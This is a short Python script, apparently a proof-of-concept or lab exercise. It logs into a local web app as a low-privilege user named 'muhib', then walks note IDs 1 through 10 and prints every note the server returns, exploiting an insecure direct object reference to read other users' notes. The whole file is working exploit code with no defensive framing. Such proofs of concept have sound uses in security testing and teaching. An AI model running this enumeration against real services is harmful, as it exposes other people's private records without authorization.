import requests

# log in as muhib (a normal, low-privilege user)
s = requests.Session()
s.get("http://127.0.0.1:5000/login/muhib", timeout=10)

# now walk every note id and grab whatever comes back
for note_id in range(1, 11):
    r = s.get(f"http://127.0.0.1:5000/note/{note_id}", timeout=10)
    if r.status_code == 200:
        print(f"--- note {note_id} ---")
        print(r.text)